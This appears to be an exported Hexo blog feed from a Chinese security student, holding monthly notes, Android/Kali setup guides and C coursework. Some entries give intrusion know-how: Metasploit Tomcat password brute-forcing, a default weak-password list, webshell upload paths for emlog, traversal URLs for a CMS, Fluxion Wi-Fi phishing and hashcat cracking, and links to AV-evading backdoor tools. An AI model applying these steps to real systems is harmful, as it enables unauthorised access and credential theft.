charset=utf-8Content-Length: 168&#123;&quot;contentId&quot;:&quot;786458&quot;,&quot;macro&quot;:&#123;&quot;name&quot;:&quot;widget&quot;,&quot;body&quot;:&quot;&quot;,&quot;params&quot;:&#123;&quot;url&quot;:&quot;https://www.viddler.com/v/23464dc6&quot;,&quot;width&quot;:&quot;1000&quot;,&quot;height&quot;:&quot;1000&quot;,&quot;_template&quot;:&quot;../web.xml&quot;&#125;&#125; 更多功能 参考1 获取shell 工具Github渗透工具资源整合 超级弱口令多线程检查审计工具SNETCracker可快速发现弱密码、弱口令账号，密码支持和用户名结合进行检查，大大提高成功率，支持自定义服务端口和字典。下载地址 Github关键字监测、告警、发现下载地址 AVIator是一个后门生成器实用程序，它使用加密和注入技术来绕过AV检测。下载地址 Vxscan：一款用于渗透测试的多功能扫描工具下载地址 thinkphp v5.x 远程代码执行漏洞-POC集合下载地址 实战中常用工具汇总1.进程隐藏工具libprocesshiderReptile2.流量代理工具proxydog-tunnel3.Linux辅助提权工具LinEnum.shLinEnum4.脏牛提权工具c0w64c0w645.内网流量代理工具agent.exenps]]></content>
      <categories>
        <category>总结</category>
      </categories>
      <tags>
        <tag>总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一九年五月总结]]></title>
    <url>%2F%E4%B8%80%E4%B9%9D%E5%B9%B4%E4%BA%94%E6%9C%88.html</url>
    <content type="text"><![CDATA[学习博客1.漏洞挖掘大佬blackwolf的博客 2.mntn0x的博客 Tomcat密码爆破使用Metasploit实现Tomcat密码爆破 1.启动 msfconsole 2.搜索模块 search tomcat 3.调用模块 use auxiliary/scanner/http/tomcat_mgr_login 4.配置 123456配置RHOST,RHOST是目标主机IP&gt; set RHOST X.X.X.X配置RPORT,RPORT是目标主机端口&gt; set RPORT XXXX更改字典：可以通过设定PASS_FILE和USER_FILE配置项的路径进行更改（通常情况默认就行了） 5.运行 run 参考文章 1.Tomcat密码爆破小记 next主题倒腾官方文档:点击进入 报错解决： ENOENT: no such file or directory, open ‘D:\ myBlog\ themes\ next\ layout\ scripts\ schemes. swig’ 原因是配置文件 _config.yml有问题，我这是友情链接：后没空格的原因 参考文章 工具图片在线设计感谢专业大神orangice的指导 在线图片设计fotor:地址 visual studio 2012 安装推荐一个高速下载还提供密钥的站点：点击进入 C-Free 5下载下载网址：点击进入 注册码:用户名：tianfang邮箱：`quart@163.com注册码：2NnUqd3shO2agta0xNjcusfK1LXO` 参考文章 注意事项C-Free 5安装好后记得改文件夹名把中间的空格去掉，否则会报以下错误 [Error] g++.exe: 5\mingw\lib\: No such file or directory [Error] g++.exe: 5\mingw\mingw32\lib\: No such file or directory [Error] g++.exe: 5\mingw\bin\: No such file or directory [Error] g++.exe: 5\mingw\mingw32\bin\: No such file or directory 参考文章 C程序线性表综合题 1.按照输入的顺序建立顺序表2.对顺序表进行排序（直接插入、冒泡、选择、快速、合并)3.按照由大到小的顺序建立一个单链表4.链表逆置5.将顺序表和链表合并成一个有序表。6.结果输出 解题思路和函数调用图参考 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;malloc.h&gt;typedef struct &#123; /*链表节点*/ int data; struct Node *next;&#125;Node;int array[100]; /*线性表用数组存储*/int count; /*顺序表计数器*/int createList (int arr[]) &#123; /*建立顺序表*/ int i; arr[0] = 0; printf("请输入顺序表长度："); scanf("%d", &amp;count); for (i = 1; i &lt;= count; i++) &#123; printf("请输入顺序表第%d节点数据:",i); scanf("%d", &amp;arr[i]); &#125; return 1;&#125;int printList(int arr[]) &#123; /*打印顺序表*/ int i; for (i = 1; i &lt;= count; i++) &#123; /*打印排序结果*/ printf("%d ", arr[i]); &#125; printf("\n"); return 1;&#125;int sort(int arr[]) &#123; /*排序列表*/ int M = 1, N = count, i, ch;/*建立快速，归并排序所需数组*/ int r1[N + 1], r2[N + 1]; for (i = 1; i &lt;= N; i++) &#123; r1[i - 1] = arr[i]; &#125; //system("CLS"); printf("1.直接插入排序\n"); printf("2.冒泡排序\n"); printf("3.直接选择排序\n"); printf("4.快速排序\n"); printf("5.归并排序\n"); printf("请输入你的选择："); scanf("%d", &amp;ch); switch(ch) &#123; case 1:insertSort(arr);break; case 2:bubbleSort(arr);break; case 3:selectionSort(arr);break; case 4:quickSort(arr, M, N);break; case 5:mergeSort(r1, r2, 0, N - 1); for (i = 1; i &lt;= N; i++) &#123; arr[i] = r1[i - 1]; &#125;break; &#125;&#125;int insertSort(int arr[]) &#123; /*直接插入排序*/ int i, j; for (i = 2; i &lt;= count; i++) &#123; arr[0] = arr[i]; /*array[0]作为监督哨*/ j = i - 1; while (arr[0] &lt; arr[j]) &#123; /*从后向前找到第一个关键字不小于arr[0]的记录*/ arr[j + 1] = arr[j]; j--; &#125; arr[j + 1] = arr[0]; &#125; return 1;&#125;int bubbleSort(int arr[]) &#123; /*冒泡排序*/ int i, j, temp; for (i = 1; i &lt;= count; i++) &#123; for (j = 1; j &lt;= count - i; j++) &#123; if (arr[j] &gt; arr[j + 1]) &#123; temp = arr[j + 1]; arr[j + 1] = arr[j]; arr[j] = temp; &#125; &#125; &#125; return 1;&#125;int selectionSort(int arr[]) &#123; /*直接选择排序*/ int i, j, temp, m; for (i = 1; i &lt;= count; i++) &#123; m = i; for (j = i + 1; j &lt;= count; j++) &#123; /*找到最小的数字*/ if(arr[j] &lt; arr[m]) &#123; m = j; &#125; if (i != m) &#123; temp = arr[i]; arr[i] = arr[m]; arr[m] = temp; &#125; &#125; &#125;&#125;int quickSort(int arr[], int M, int N) &#123; /*快速排序*/ int i, j, x; i = M, j = N; x = arr[i]; do &#123; while ((arr[j] &gt;= x) &amp;&amp; (j &gt; i)) &#123; j--; &#125; if (i &lt; j) &#123; arr[i] = arr[j]; i++; while (arr[j] &lt;= x &amp;&amp; (i &lt; j)) &#123; i++; &#125; if (i &lt; j) &#123; arr[j] = arr[i]; j--; &#125; &#125; &#125;while (i != j); arr[i] = x; i++; j--; if (M &lt; j) &#123; quickSort(arr, M ,j); &#125; if (i &lt; N) &#123; quickSort(arr, i, N); &#125;&#125;int merge(int r[], int r2[], int S, int M, int N) &#123; int i,k,j; i = S, k = S, j = M + 1; /*从S开始*/ while ((i != M + 1) &amp;&amp; (j != N + 1)) &#123; /*当两个表都有内容未排完时*/ if (r[i] &gt; r[j]) &#123; r2[k] = r[j]; j++; &#125; else &#123; r2[k] = r [i]; i++; &#125; k++; &#125; while (i != M + 1) &#123; /*将剩下的全部放入*/ r2[k++] = r[i++]; &#125; while (j != N + 1) &#123; r2[k++] = r[j++]; &#125; for (i = S; i &lt;= N; i++) &#123; r[i] = r2[i]; &#125;&#125;int mergeSort(int r[], int r2[], int S, int N) &#123; /*归并排序*/ int M; if (S &lt; N) &#123; M = (S + N)/2; mergeSort(r, r2, S, M); mergeSort(r, r2, M + 1, N); merge(r, r2, S, M, N); &#125;&#125;int createNode(Node *L) &#123; /*建立链表*/ Node *q; int m, n, i; /*节点个数为m，节点数据为n*/ printf("请输入链表节点个数："); scanf("%d", &amp;m); for (i = 0; i &lt; m; i++) &#123; q = (Node*)malloc(sizeof(Node)); printf("请输入第%d节点数据：",i+1); scanf("%d", &amp;n); q -&gt; data = n; L -&gt; next = q; L = q; &#125; L -&gt; next = NULL; /*尾标识为NULL*/ printf("\n"); return 1;&#125;int sortNode(Node *L) &#123; /*对链表节点进行排序，仅交换数据*/ int i, j, tempData; Node *head, *point; /*辅助指针point帮助指向head的下一个节点*/ head = L; head = head -&gt; next; int length = 0; while (head -&gt; next != NULL) &#123; /*计算链表长度*/ head = head -&gt; next; length++; &#125; for (i = 0; i &lt; length; i++) &#123; /*冒泡排序*/ head = L; /*将head复位*/ head = head -&gt; next; for(j = i; j &lt; length; j++) &#123; point = head -&gt; next; if(head -&gt; data &gt;= point -&gt; data) &#123; tempData = head -&gt; data; head -&gt; data = point -&gt; data; point -&gt; data = tempData; &#125; head = head -&gt; next; &#125; &#125; head = L; /*指针回到开头*/ head = head -&gt; next; while (head != NULL) &#123; /*将排序后的线性表显示出来*/ printf("%d ", head -&gt; data); head = head -&gt; next; &#125; printf("\n"); return 1;&#125;int combine(int arr[], Node *L2) &#123; /*结合两张表*/ int a[100]; int i, j, temp; for (i = 1; i &lt;= count; i++) &#123; a[i - 1] = arr[i]; &#125; while (L2 != NULL) &#123; a[count] = L2 -&gt; data; count++; L2=L2-&gt;next; &#125; for (i = 0; i &lt;= count; i++) &#123; for (j = 0; j &lt;= count - i; j++) &#123; if (a[j] &gt; a[j + 1]) &#123; temp = a[j + 1]; a[j + 1] = a[j]; a[j] = temp; &#125; &#125; &#125; for (i = 0; i &lt;count-1; i++) &#123; printf("%d ", a[i]); &#125;&#125;int main() &#123; int choose; Node *L2; L2 = (Node*)malloc(sizeof(Node)); while(1) &#123; printf("1.建立顺序表\n"); createList(array);printList(array); printf("2.顺序表排序\n"); sort(array);printList(array); printf("3.建立链表\n"); createNode(L2); printf("4.逆置链表\n"); sortNode(L2); printf("5.合并顺序表与链表\n"); combine(array,L2); &#125; printf("\n"); &#125; 飞机票预订系统可在同一文件夹下创建Customer.txt文件存储信息。不过用来读取信息不能实现。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;malloc.h&gt;typedef struct customer &#123; /*乘客结构体*/ char name[20]; int id; int seat; char sex[10]; char goal[10]; char type[1];&#125;Customer;typedef struct list &#123; /*将乘客规划为数组*/ Customer *array[25]; /*最大存放25人*/ int length;&#125;sqList;typedef struct node &#123; /*将飞机规划为链表*/ int number; int input; struct node *next;&#125;Node;int temp1 = 0; /*航班计数器*/int temp2 = 0; /*人数计数器*/int createPlane(Node *L) &#123; /*创建飞机链表*/ int x, y; do &#123; printf("请输入飞机序号(序号为0时输入完毕)："); scanf("%d", &amp;x); if (x != 0) &#123; printf("请输入登机口："); scanf("%d", &amp;y); Node *q; /*定义新节点*/ q = (Node*)malloc(sizeof(Node)); temp1++; q -&gt; number = x; q -&gt; input = y; L -&gt; next = q; L = q; &#125; &#125;while(x != 0); /*飞机序号为0时结束*/ L -&gt; next = NULL; return 1;&#125;int deleteNode(Node *L) &#123; /*删除飞机节点*/ int num; Node *q; q = L; Node *r = q; q = q -&gt; next; printf("请输入要删除的飞机序号（警告该飞机下的乘客全部删除！）："); scanf("%d", &amp;num); while(q != NULL) &#123; if (q -&gt; number == num) &#123; r -&gt; next = q -&gt; next; free(q); temp1--; return 1; &#125; else &#123; q = q -&gt; next; r = r -&gt; next; &#125; &#125; printf("未找到该飞机！"); return 0;&#125;int initSqList (sqList *S) &#123; /*容器初始化*/ S -&gt; length = 0; return 1;&#125;int createSqList (Node *L, sqList *S) &#123; /*构造乘客容器*/ int x, y, i; Node *q; q = L; q = q -&gt; next; printf("请输入乘客所在飞机号："); scanf("%d", &amp;x); while (q != NULL) &#123; if (q -&gt; number == x) &#123; printf("该飞机共有几名乘客:"); scanf("%d", &amp;y); for (i = temp2 + 1; i &lt;= y; i++) &#123; S -&gt; array[i] = createCustomer(i); S -&gt; length ++; temp2++; &#125; return S; &#125; else &#123; q = q -&gt; next; &#125; &#125; printf("未找到该飞机序号！"); return 0;&#125;int createCustomer(int i) &#123; /*创建新乘客*/ Customer *q; q = (Customer*)malloc(sizeof(Customer)); printf("请输入乘客身份识别号："); scanf("%d", &amp;(q -&gt; id)); printf("请输入乘客姓名："); scanf("%s", &amp;(q -&gt; name)); printf("请输入座位号："); scanf("%d", &amp;(q -&gt; seat)); printf("请输入乘客性别："); scanf("%s", &amp;(q-&gt; sex)); printf("请输入目的地："); scanf("%s", &amp;(q -&gt; goal)); printf("请输入舱位种类: "); scanf("%s", &amp;(q -&gt; type)); return q;&#125;int searchPlane(Node *L) &#123; /*搜寻航班*/ int x, y; Node *q; q = L; printf("请输入航班序号："); scanf("%d", &amp;x); while (q != NULL) &#123; if (x == q -&gt; number) &#123; printf("找到该航班！\n"); printf("航班序号：%d, 登机口:%d\n", q -&gt; number, q -&gt; input); return 1; &#125; else &#123; q = q -&gt; next; &#125; &#125; printf("未找到该航班\n"); return 0;&#125;int searchCustomer(Node *L, sqList *S) &#123; /*搜寻乘客*/ int x, y, i; char s; Node *q; q = L; q = q -&gt; next; printf("请输入乘客所在飞机号："); /*检测飞机是否存在*/ scanf("%d", &amp;x); while(q != NULL) &#123; if (q -&gt; number == x) &#123; break; &#125; else &#123; q = q -&gt; next; &#125; &#125; if (q == NULL) &#123; printf("未找到该飞机\n"); return 0; &#125; printf("请输入乘客身份识别号："); scanf("%d", &amp;y); for (i = 1; i &lt;= temp2; i++) &#123; if (y == S -&gt; array[i] -&gt; id) &#123; printf("找到乘客，打印出数据：\n"); printf("乘客姓名：%s\n", S -&gt; array[i] -&gt; name); printf("乘客身份识别号：%d\n", S -&gt; array[i] -&gt; id); printf("乘客座位号：%d\n", S -&gt; array[i] -&gt; seat); printf("乘客目的地: %s\n", S -&gt; array[i] -&gt; goal); printf("舱位种类：%s\n", S -&gt; array[i] -&gt; type); return 1; &#125; &#125; printf("未找到该乘客\n"); return 0;&#125;int reserve(Node *L, sqList *S) &#123; int i; L = L -&gt; next; FILE *fp = NULL; if ((fp = fopen("Customer.txt", "w")) == NULL) &#123; printf("不能打开文件！"); return 0; &#125; fprintf(fp, "%d\n", temp1); fprintf(fp, "%d\n", temp2); while (L != NULL) &#123; /*保存飞机节点*/ fprintf(fp,"%d %d\n", L -&gt; number, L -&gt; input); L = L -&gt; next; &#125; for (i = 1; i &lt;= temp2; i++) &#123; /*保存乘客节点*/ fprintf(fp, "%s %d %d %s %s %s\n", S -&gt; array[i] -&gt; name, S -&gt; array[i] -&gt; id, S -&gt; array[i] -&gt; seat, S -&gt; array[i] -&gt; sex, S -&gt; array[i] -&gt; goal, S -&gt; array[i] -&gt; type); &#125; fprintf(fp, "%d\n", S -&gt; length); fclose(fp); printf("成功完成"); return 1;&#125;int read(Node *L, sqList*S) &#123; FILE *fp = NULL; int i = 0; Node *q; if ((fp = fopen("Customer.txt", "r")) == NULL) &#123; printf("不能打开文件！"); return 0; &#125; fscanf(fp, "%d\n", &amp;temp1); fscanf(fp, "%d\n", &amp;temp2); for (i = 0; i &lt; temp1; i++) &#123; /*读取飞机数据*/ q = (Node*)malloc(sizeof(Node)); fscanf(fp, "%d %d\n", &amp;q -&gt; number, &amp;q -&gt; input); L -&gt; next = q; L = q; &#125; for (i = 1; i &lt;= temp2; i++); &#123; Customer *temp; temp = (Customer*)malloc(sizeof(Customer)); fscanf(fp,"%s %d %d %s %s %s\n", &amp;temp -&gt; name, &amp;temp -&gt; id, &amp;temp -&gt; seat, &amp;temp -&gt; sex, &amp;temp -&gt; goal, &amp;temp -&gt; type); S -&gt; array[i] = temp; &#125; fscanf(fp ,"%d\n", &amp;S -&gt; length); fclose(fp); printf("成功完成"); return 1;&#125;int main() &#123; Node *L; sqList *S; L = (Node*)malloc(sizeof(Node)); S = (sqList*)malloc(sizeof(sqList)); initSqList(&amp;S); int ch; while (1) &#123; printf(" --------飞机票预订系统--------\n"); printf(" 1.创建航班\n"); printf(" 2.创建乘客\n"); printf(" 3.查询航班信息\n"); printf(" 4.查询乘客信息\n"); printf(" 5.保存信息\n"); printf(" 6.读取信息\n"); printf(" 7.删除飞机信息\n"); printf(" 0.退出系统\n"); printf("请输入您的选择:"); scanf("%d", &amp;ch); switch (ch) &#123; case 1:createPlane(&amp;L);break; case 2:S = createSqList(&amp;L, &amp;S);break; case 3:searchPlane(&amp;L);break; case 4:searchCustomer(&amp;L, S);break; case 5:reserve(&amp;L, S);break; case 6:read(&amp;L, &amp;S);break; case 7:deleteNode(&amp;L);break; case 0:exit(0); &#125; &#125;&#125; 源码参考]]></content>
      <categories>
        <category>总结</category>
      </categories>
      <tags>
        <tag>总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一九年四月总结]]></title>
    <url>%2F%E4%B8%80%E4%B9%9D%E5%B9%B4%E5%9B%9B%E6%9C%88.html</url>
    <content type="text"><![CDATA[一九年四月总结论坛：日本技术论坛:qiita Medium:是一个博客发布平台，由 Twitter 联合创办人埃文·威廉姆斯和比兹·斯通于2012年8月创办。该平台有专业和非专业的贡献者，亦有受雇的编者，是社会新闻报导的例子之一。websec文章 vulnspy:一个带有漏洞复现，漏洞博客的站点，点击访问 chabug团队论坛：点击访问 工具外链转换网站:网站链接 iTunes实现PC到ipad文件传输：百度知道 音乐外链:热门歌曲下载 漏洞查询网站:exploit-db 过狗工具冰蝎:下载地址 电报安卓旧版:下载地址 漏洞讯时系统(xuas)后台漏洞回显后台： /admin/admin_news_pl_view.asp?id=1 列目录漏洞： http://www.xx.com/edit/admin_uploadfile.asp?id=46&amp;dir=../.. 漏洞参考文章 讯时系统(xuas)最新通杀漏洞0day图文说明 讯时后台管理系统v4.9的鸡肋漏洞分析 emblog拿shell思路1.后台爆破试试弱口令 2.上传模板拿shell，模板文件夹中放入木马，路径为content/templates/模板名/木马名 3.上传插件拿shell，插件文件夹中放入木马，路径为content/plugins/模板名/木马名 4.设置那里有个“允许上传的附件类型 ”，加入asp文件类型（emlog限制了添加php的后缀，没把asp的给限制）未验证是否可行 漏洞参考文章 emlog后台拿shell方法合集 emlog后台作者权限SQL注入 针对emlog友情链接插件审计出的SQL注入漏洞 emlog全版本后台GetShell 视频教程 参考文章冰蝎1.冰蝎动态二进制加密过waf并修改自己菜刀过狗 2.冰蝎项目readme 伪造电子邮件以及制造电子邮件炸弹的攻防探讨freebuf文章,作者的个人博客 github学习项目1.“北大图书馆”Github传送门 2.浙大项目传送门3.清华大学共享了计算机系课程资源4.中科大共享了计算机学院的课程资源 5.上海交大共享了14门关于计算机和高数的课程资源 给四月的一些碎碎念四月，慢慢地自己进入了考研复习的状态，但是并没有全身心的投入，以至于瞎搞了这些四月的技术方面的骚操作。博客在四月后到考研结束，骚操作将不会更新。可能会更新一些算法吧，一来是为了复习数据结构，二来是提升一下编程能力。万一复习得不错选了一个有机试的学校呢？ 希望自己不要辜负大学最后一段青春，愿自己如愿以偿。 放下所有无关的东西，好好学习天天向上。]]></content>
      <categories>
        <category>总结</category>
      </categories>
      <tags>
        <tag>总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一九年三月总结]]></title>
    <url>%2F%E4%B8%80%E4%B9%9D%E5%B9%B4%E4%B8%89%E6%9C%88.html</url>
    <content type="text"><![CDATA[一九年三月总结渗透学习1.通过已有黑页后面找马，尝试使用弱口令登陆 intext：请于用于非法用途，后果作者概不负责！ 2.学习文章，多见识已有思想。 secwiki:SecWiki官网 先知社区:链接 3.常用弱口令 12345administrator:passwordadmin:12345root:secretguest:guestroot:toor 常看文章25端口渗透：国光可伪造邮件进行钓鱼等 iis短文件名泄露:github的代码感觉危害不大，没利用过 thinkphp 5.0漏洞:命令执行漏洞好好利用可getshell 推荐阅读博客hof的博客 Allesa学姐的博客 老潘的博客]]></content>
      <categories>
        <category>总结</category>
      </categories>
      <tags>
        <tag>总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hexo搬迁]]></title>
    <url>%2Fhexo%E6%90%AC%E8%BF%81.html</url>
    <content type="text"><![CDATA[环境之前的博客是在kali上搭建的,开学了旧电脑懒得带自能搬家博客了。 系统：win10 博客安装环境：nodejs、hexo 之前参看本专业大神的博客试着搭建过，后来没成功，但是环境没卸载。当时的参考文章 搬迁网上有通过github的方式进行搬迁，我嫌太麻烦了，就直接从kali上把博客的文件夹拷贝了。1.d盘创建myBlog文件夹2.将文件解压到文件夹下 问题暂时就gulp不能正常使用解决办法：npm install -g gulp 总结先凑合着用，以后发现有什么需要改进的地方再解决 更新： 2019/2/25 写文章TyporaTypora是一个markdown编辑器，之前一直是用admin插件在写文章，听说这款软件不错，于是想试试。 下载地址:官网 PicGoPicGo是一个快捷的图片部署工具 下载安装项目地址帮助文档 配置PicGo支持Github图床，我是参考这篇文章来进行的配置 登陆GitHub新建repo, 命名为img设置好token 访问：https://github.com/settings/tokens 选择generate new token 打勾repo 选择generate token 注意：这个token生成后只会显示一次！ 在PicGo页面根据提示进行填写imagine图片压缩工具，下载：项目地址 软件样式]]></content>
      <categories>
        <category>WEB学习</category>
      </categories>
      <tags>
        <tag>hexo倒腾</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[kali 科学上网]]></title>
    <url>%2F%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91.html</url>
    <content type="text"><![CDATA[kali 科学上网32位的kali貌似没有图形化操作界面的科学上网软件，于是只好使用命令行操作了。 安装终端输入： sudo apt install shadowsocks 编辑帐号密码终端输入： vi /etc/shadowsocks.json 在配置文件中按照下面的格式填写配置信息，也就帐号密码之类的 1234567891011&#123; &quot;server&quot;:&quot;服务器地址&quot;, &quot;server_port&quot;:服务器端口号, &quot;local_address&quot;: &quot;127.0.0.1&quot;, &quot;local_port&quot;:1080, &quot;password&quot;:&quot;密码&quot;, &quot;timeout&quot;:300, &quot;method&quot;:&quot;加密方式&quot;, &quot;fast_open&quot;: true, &quot;workers&quot;: 1&#125; 设置proxychains打开配置文件 vi /etc/proxychains.conf 1.去掉dynamic_chain前面的注释符 2.在最下方，默认是sock4 xxxx xxx改为sock5 127.0.0.1 xxxx （xxxx是自己刚才设定的端口号，也就是上边配置ss时输入的local_port:xxxx） 根据上面的设置此处就应该该为sock5 127.0.0.1:1080 测试代理是否正常 proxyresolv www.target.com 如果出现命令未找到，终端执行 cp /usr/lib/proxychains3/proxyresolv /usr/bin/ 正常情况是没有开代理返回timeout 开启代理开启代理 sslocal -c /etc/shadowsocks.json -d start 转发启动软件 火狐：proxychains firefox 不用了就关闭代理 sslocal -c /etc/shadowsocks.json -d stop 整个安装使用过程比较顺利，这可能和之前使用了ss的一些依赖环境有关 需要关闭火狐再使用转发启动软件]]></content>
      <categories>
        <category>linux学习</category>
      </categories>
      <tags>
        <tag>科学上网</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WiFi小结]]></title>
    <url>%2FWiFi%E7%A0%B4%E8%A7%A3%E5%B0%8F%E7%BB%93.html</url>
    <content type="text"><![CDATA[学习小结 免责声明:以下内容仅供学习参考 跑包GUP跑包转换格式使用hashcat密码破解,首先使用工具将cap转换成hccapx方法一：在线转换网站方法二：下载工具工具下载：下载下载完成后进入src目录编译cap2hccapx.c gcc cap2hccapx.c -o cap2hccapx 转换文件 ./cap2hccapx input.pcap output.hccapx 解密方法一：使用naive-hashcat解密，我的垃圾电脑跑不了，这个只是了解参考。项目地址 方法二:在线解密 这个需要支付BTC:穷，玩不起，没使用 这个可以免费跑2千万个密码:结果会发送到填写的邮箱 欺骗用户设备一台PC–kali系统 一个usb无线网卡–RT3070 两台手机–一台开热点一台模拟合法用户 软件下载最新版本 git clone https://github.com/FluxionNetwork/fluxion.git 我使用的是3.10版本的，在项目地址自行下载 运行 cd fluxion sudo ./fluxion.sh 按照提示进行使用，可参考[sevge博客]的fluxion一文，其实在项目的网站说明了需要使用外置的usb网卡我一开始是使用的内置无线网卡，使用程序一直卡在创建AP处。后来请教sevge大佬，解决了这个问题 问题我使用的V3.10存在不管密码是否正确，程序都会结束wifi干扰 结果获得正确的密码 社会工程学定位使用路由器mac地址来定位地址，查询网站。测试效果精确 参考文章Wifi小结-github 关于定位的文章 fluxion使用文章]]></content>
      <categories>
        <category>无线学习</category>
      </categories>
      <tags>
        <tag>无线安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[安卓手机安装kali(2)]]></title>
    <url>%2F%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E5%AE%89%E8%A3%85kali-2.html</url>
    <content type="text"><![CDATA[使用VNC前面已经安装好了kali，接下来是看看图形化界面了。 安卓手机由于我的安卓版本比较低，使用不了网上博文中提供VNC viewer,安卓4.4+使用的VNC viewer,该地址还提供其他系统的版本我的垃圾手机是没有这个福利了，只好找其他替代软件了，经过几番查找找到了一个140多k的软件 kali电脑下载VNC viewer apt-get install tigervnc-viewer 运行 viewer 安装中文库使用ssh连接手机后root执行下面的命令 apt-get install xfonts-intl-chinese apt-get install ttf-wqy-microhei 启动VNC服务端执行命令 vncserver 返回结果123New &apos;X&apos; desktop is localhost:1Starting applications specified in /home/android/.vnc/xstartupLog file is /home/android/.vnc/localhost:1.log 证明vncserver已启动成功因为刚刚终端返回的信息:New ‘X’ desktop is localhost:1指定了此次桌面会话号为1，所以端口就为5900+1=5901。如果我们开启了多个虚拟桌面，它们的会话号为2,3,4…，那么各自的端口即为5902,5903,5904…依次类推。 问题停止Linux系统再启动Linux系统后，再次执行vncserver命令会出现报错解决办法：12rm -rf /tmp/.X[1-9]-lockrm -rf /tmp/.X11-unix/X[1-9] 分辨率vncserver默认的分辨率是1024×768手机屏幕的分辨率都是720P(1280×720)，1080P(1920×1080)，甚至2K(2560×1440)启动vncserver时，执行： vncserver -geometry 1280x720 命令中的1280x720里的x是小写字母x 自动更改分辨率 vim ~/.bashrc #编辑~/.bashrcalias vncserver=’vncserver -geometry 1280x720’ 参考文章美丽应用安装vncserver]]></content>
      <categories>
        <category>linux学习</category>
      </categories>
      <tags>
        <tag>玩手机</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[安卓手机安装kali]]></title>
    <url>%2F%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E5%AE%89%E8%A3%85kali.html</url>
    <content type="text"><![CDATA[前提安装好了前面ubuntu那篇文章中的三个软件 添加源我使用的是中科大的源 http://mirrors.ustc.edu.cn/kali/ 源的格式 中科大 - http://mirrors.ustc.edu.cn/+Linux&#39;s Name/ 阿里云 - http://mirrors.aliyun.com/+Linux&#39;s Name/ 问题获取管理员权限sudo出现问题12sudo: PERM_ROOT: setresuid(0, -1, -1): 权限不够sudo: 无法初始化策略插件 相关问题，参考文章-github地址网传解决方法是把用户名设为root然后再重新配置，这个方法没有解决我的问题，还导致我不能登录设备 最后我先用普通用户ssh登录，然后su，默认密码是toor。这样也能获取管理员权限 推荐阅读基础文章进阶文章 可继续学习博客 小结之前在学校捣腾了一下午，失败告终，今日再度从0开始学习总算成功了。]]></content>
      <categories>
        <category>linux学习</category>
      </categories>
      <tags>
        <tag>玩手机</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[安卓手机安装ubuntu]]></title>
    <url>%2F%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E5%AE%89%E8%A3%85ubuntu.html</url>
    <content type="text"><![CDATA[工具一台安卓4.2的手机 将手机ROOT，ROOT工具一键ROOT ROOT工具下载 一台电脑 软件Linux系统支撑软件:Linux deploy Linux deploy支撑软件:Busy Box 手机端SSH连接软件:ConnectBox 我参考了一篇17年的安卓4.1文章，为保险起见我安装的是17年的Linux deploy 安装首先安装的是Busy Box Busy Box默认界面语言是英文，可以改成中文，点击右上角部分，在弹出的菜单中选择Settings，接着进入设置界面，找到Language项，点击后选择简体中文 点击安装，等待程序自行运行，在界面中输出## END后退出程序 安装运行Linux deploy 点击左上角选择设置找到PATH变量，赋予其值 /system/xbin 这里的路径是Busy Box的安装路径 先移除环境再更新环境 选择锁定WIFI 防止下载掉线 退回主界面，点击右下角部分,文中没有的为默认的，配置如下： 123456789属性:linuxContainerization method (chroot)发行版（Ubuntu）架构（armhf）发行版版本（xenial）源地址 （http://mirrors.ustc.edu.cn/ubuntu-ports）安装类型（文件）安装路径（$&#123;ENV_DIR&#125;/linux.img）本地化（zh_CN.UTF-8） 安装路径是Linux系统的安装路径，如要安装在手机自带的存储空间中，则在路径开头加上${ENV_DIR}，这代表的是存储空间根目录。如要安装在sdcard中，则加上${EXTERNAL_STORAGE}。 用户名和密码自定义，本地、远程连接该系统用。 INIT 选择Enable MOUNTS 选择Enable (挂载功能可让Linux系统访问手机上的文件挂载列表中添加访问手机内容的目录，/sdcard:sdcard为手机自带存储空间根目录，/storage/sdcard1为sd卡根目录。) SSH 选择Enable 图形界面 选择Enable (桌面环境选择Xfce) 退出系统设置界面，点击主界面右上角，选择安装。&lt;&lt;&lt;deploy则安装完毕。没有报错则安装成功。注意：安装完毕后要先点击停止按钮，再按启动按钮 安装ConnectBot 点击右上角 +号创建 输入用户名，主机输入localhost 点击右上角 +号保存信息，主界面会多出来添加的选项，点击进行SSH连接 效果ss连接上后 总结整个安装过程不太顺利，需要多次调试。强烈推荐中科大的源安装速度快好用得很 参考文章首先参考文章图形化界面操作文章中科大源]]></content>
      <categories>
        <category>linux学习</category>
      </categories>
      <tags>
        <tag>玩手机</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[添加页面标题欺骗]]></title>
    <url>%2F%E6%B7%BB%E5%8A%A0%E9%A1%B5%E9%9D%A2%E6%A0%87%E9%A2%98%E6%AC%BA%E9%AA%97.html</url>
